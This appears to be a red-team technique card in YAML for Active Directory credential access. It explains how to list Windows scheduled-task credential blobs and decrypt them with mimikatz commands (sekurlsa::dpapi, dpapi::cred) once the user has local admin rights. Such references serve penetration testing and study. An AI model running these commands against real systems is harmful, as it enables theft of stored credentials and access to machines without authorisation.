title: Extracting Secrets from scheduled tasks
category: 
  - AD:
    - Credential Access
tactic: Credential Access
tags: []
description: Scheduled Tasks can save credentials so that they can run under the context of a user 
  without them having to be logged on.  If we have local admin privileges on a machine, we can 
  decrypt them in much the same way.  The blobs are saved under 
  C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\
  
references:
  - https://github.com/GhostPack/Seatbelt

steps:
  - description: List secrets
    options: 

      - tool: cmd.exe
        usage: | 
          dir C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
  
  - description: Extract the AES128/256 encryption key
    options: 
      - tool: mimikatz 
        usage: |
          #locally
          mimikatz !sekurlsa::dpapi
   
  - description: Decrypt the blobs
    options: 
      - tool: mimikatz 
        usage: |
          mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9

comments:
  